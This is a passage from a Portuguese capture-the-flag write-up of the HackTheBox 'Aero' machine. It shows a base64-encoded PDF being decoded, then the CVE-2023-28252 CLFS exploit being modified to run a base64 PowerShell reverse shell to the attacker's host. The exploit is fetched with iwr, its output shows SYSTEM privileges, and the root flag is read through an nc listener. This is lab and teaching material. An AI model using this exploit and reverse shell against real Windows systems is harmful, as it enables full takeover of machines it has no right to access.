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0L0JBQUFBQStMaWJlcmF0aW9uTW9ubwovRmlyc3RDaGFyIDAKL0xhc3RDaGFyIDU2Ci9XaWR0aHNbMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMAo2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAKNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwCjYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIDYwMCA2MDAgNjAwIF0KL0ZvbnREZXNjcmlwdG9yIDcgMCBSCi9Ub1VuaWNvZGUgOCAwIFIKPj4KZW5kb2JqCgoxMCAwIG9iago8PC9GMSA5IDAgUgo+PgplbmRvYmoKCjExIDAgb2JqCjw8L0ZvbnQgMTAgMCBSCi9Qcm9jU2V0Wy9QREYvVGV4dF0KPj4KZW5kb2JqCgoxIDAgb2JqCjw8L1R5cGUvUGFnZS9QYXJlbnQgNCAwIFIvUmVzb3VyY2VzIDExIDAgUi9NZWRpYUJveFswIDAgNjEyIDc5Ml0vQ29udGVudHMgMiAwIFI+PgplbmRvYmoKCjQgMCBvYmoKPDwvVHlwZS9QYWdlcwovUmVzb3VyY2VzIDExIDAgUgovTWVkaWFCb3hbIDAgMCA2MTIgNzkyIF0KL0tpZHNbIDEgMCBSIF0KL0NvdW50IDE+PgplbmRvYmoKCjEyIDAgb2JqCjw8L1R5cGUvQ2F0YWxvZy9QYWdlcyA0IDAgUgovT3BlbkFjdGlvblsxIDAgUiAvWFlaIG51bGwgbnVsbCAwXQovTGFuZyhlbi1VUykKPj4KZW5kb2JqCgoxMyAwIG9iago8PC9DcmVhdG9yPEZFRkYwMDU3MDA3MjAwNjkwMDc0MDA2NTAwNzI+Ci9Qcm9kdWNlcjxGRUZGMDA0QzAwNjkwMDYyMDA3MjAwNjUwMDRGMDA2NjAwNjYwMDY5MDA2MzAwNjUwMDIwMDAzNzAwMkUwMDM0PgovQ3JlYXRpb25EYXRlKEQ6MjAyMzA5MjExODE4MTQrMDInMDAnKT4+CmVuZG9iagoKeHJlZgowIDE0CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAxMzIwNSAwMDAwMCBuIAowMDAwMDAwMDE5IDAwMDAwIG4gCjAwMDAwMDE1NTAgMDAwMDAgbiAKMDAwMDAxMzMwMyAwMDAwMCBuIAowMDAwMDAxNTcxIDAwMDAwIG4gCjAwMDAwMTE5ODcgMDAwMDAgbiAKMDAwMDAxMjAwOSAwMDAwMCBuIAowMDAwMDEyMTk3IDAwMDAwIG4gCjAwMDAwMTI3MzcgMDAwMDAgbiAKMDAwMDAxMzExOCAwMDAwMCBuIAowMDAwMDEzMTUwIDAwMDAwIG4gCjAwMDAwMTM0MDIgMDAwMDAgbiAKMDAwMDAxMzQ5OSAwMDAwMCBuIAp0cmFpbGVyCjw8L1NpemUgMTQvUm9vdCAxMiAwIFIKL0luZm8gMTMgMCBSCi9JRCBbIDw2MjVDNEQ2QjQ3NjREOUI3QzdDQzg0OTg1MTlGQzYxMj4KPDYyNUM0RDZCNDc2NEQ5QjdDN0NDODQ5ODUxOUZDNjEyPiBdCi9Eb2NDaGVja3N1bSAvRjBBQkY4NUJDOEIxQjkxRUYzMkVBNkM5RTUzM0QwMTQKPj4Kc3RhcnR4cmVmCjEzNjc0CiUlRU9GCg==
```

​	Depois de colocar em um arquivo, fazemos o processo contrário e o transformamos em um pdf.

```bash
┌──(kali㉿kali)-[~/…/HTB/Aero]
└─$ base64 -d fileb64.txt > file.pdf
```

![](ss/pdf.png)

​	Ao procurarmos por essa vulnerabilidade, podemos encontrar o seguinte exploit: [CVE-2023-28252](https://github.com/fortra/CVE-2023-28252).

​	Esse exploit deve ser compilado no Visual Studio, portanto, será necessário ser compilado no Windows.

​	Durante a compilacão, pode ser que dê os erros [MSB8020](https://learn.microsoft.com/pt-br/visualstudio/msbuild/errors/msb8020?view=vs-2022&f1url=%3FappId%3DDev16IDEF1%26l%3DPT-BR%26k%3Dk(MSB8020)%26rd%3Dtrue) e [C2664](https://learn.microsoft.com/pt-br/cpp/error-messages/compiler-errors-2/compiler-error-c2664?view=msvc-170&f1url=%3FappId%3DDev16IDEF1%26l%3DPT-BR%26k%3Dk(C2664)%26rd%3Dtrue). Para resolver o erro **MSB8020** é necessário instalar os pacotes de compilacão do C++ na versão 142 indo em `Ferrramentas --> Obter Ferramentas e Funcionalidades --> Componentes Individuais`, depois disso, precisamos instalar todos os pacotes com o início de nome **Ferramentas de compilacão MSVC v142**.

​	Para resolver o erro **C2664** e já modificar o nosso exploit, precisamos vir na seguinte parte do código:

```c++
if (strcmp(username, "SYSTEM") == 0){
			printf("WE ARE SYSTEM\n");
			system("notepad.exe");
			
		}
```

​	Para contornar o erro, podemos mudar a condicão do `IF` já que queremos que seja executado de toda maneira. A alteracão ficará assim:

```c++
if (1 == 1){
			printf("WE ARE SYSTEM\n");
			system("notepad.exe");
			
		}
```

​	Com o erro contornado, temos que alterar o comando que será executado. Nesse caso usaremos a shell **PowerShell #3 (Base64)** do [revshells](https://www.revshells.com/).

```c++
if (1 == 1){
	printf("WE ARE SYSTEM\n");
	system("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwACIALAAyADIAMgAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==");
	
}
```

​	Com o código alterado, podemos compilar como **Release** para **x64** no Visual Studio e mandar para nossa máquina kali.

​	Com o arquivo no kali, podemos subir um servidor, baixar o arquivo na máquina e executar.

```powershell
PS C:\programdata> iwr http://10.10.15.10/clfs_eop.exe -outfile clfs_eop.exe
iwr http://10.10.15.10/clfs_eop.exe -outfile clfs_eop.exe
PS C:\programdata> ./clfs_eop.exe
./clfs_eop.exe
[+] Incorrect number of arguments ... using default value 1208 and flag 1 for w11 and w10


ARGUMENTS
[+] TOKEN OFFSET 4b8
[+] FLAG 1


VIRTUAL ADDRESSES AND OFFSETS
[+] NtFsControlFile Address --> 00007FFD8CCA4240
[+] pool NpAt VirtualAddress -->FFFFA783E6CFF000
[+] MY EPROCESSS FFFF848D27AC50C0
[+] SYSTEM EPROCESSS FFFF848D1FEFC040
[+] _ETHREAD ADDRESS FFFF848D2449F080
[+] PREVIOUS MODE ADDRESS FFFF848D2449F2B2
[+] Offset ClfsEarlierLsn --------------------------> 0000000000013220
[+] Offset ClfsMgmtDeregisterManagedClient --------------------------> 000000000002BFB0
[+] Kernel ClfsEarlierLsn --------------------------> FFFFF8026D493220
[+] Kernel ClfsMgmtDeregisterManagedClient --------------------------> FFFFF8026D4ABFB0
[+] Offset RtlClearBit --------------------------> 0000000000343010
[+] Offset PoFxProcessorNotification --------------------------> 00000000003DBD00
[+] Offset SeSetAccessStateGenericMapping --------------------------> 00000000009C87B0
[+] Kernel RtlClearBit --------------------------> FFFFF8026F943010
[+] Kernel SeSetAccessStateGenericMapping --------------------------> FFFFF8026FFC87B0

[+] Kernel PoFxProcessorNotification --------------------------> FFFFF8026F9DBD00


PATHS
[+] Folder Public Path = C:\Users\Public
[+] Base log file name path= LOG:C:\Users\Public\65
[+] Base file path = C:\Users\Public\65.blf
[+] Container file name path = C:\Users\Public\.p_65
Last kernel CLFS address = FFFFA783E0A66000
numero de tags CLFS founded 12

Last kernel CLFS address = FFFFA783E0AEA000
numero de tags CLFS founded 1

[+] Log file handle: 00000000000000EC
[+] Pool CLFS kernel address: FFFFA783E0AEA000

number of pipes created =5000

number of pipes created =4000
TRIGGER START
System_token_value: 4141414141414141
TRYING AGAIN
TRIGGER START
System_token_value: FFFFA783D8C34598
SYSTEM TOKEN CAPTURED
Closing Handle
ACTUAL USER=SYSTEM
#< CLIXML

```

​	Dessa maneira, conseguimos reverse shell. 

```bash
┌──(kali㉿kali)-[~/…/HTB/machines/to-do/Aero]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.10.15.10] from (UNKNOWN) [10.129.229.128] 59638
whoami
nt authority\system
PS C:\programdata> cd c:\users\administrator\desktop
PS C:\users\administrator\desktop> cat root.txt
3b9e702297e4bdfa5955d54da6047cd9
PS C:\users\administrator\desktop>
```

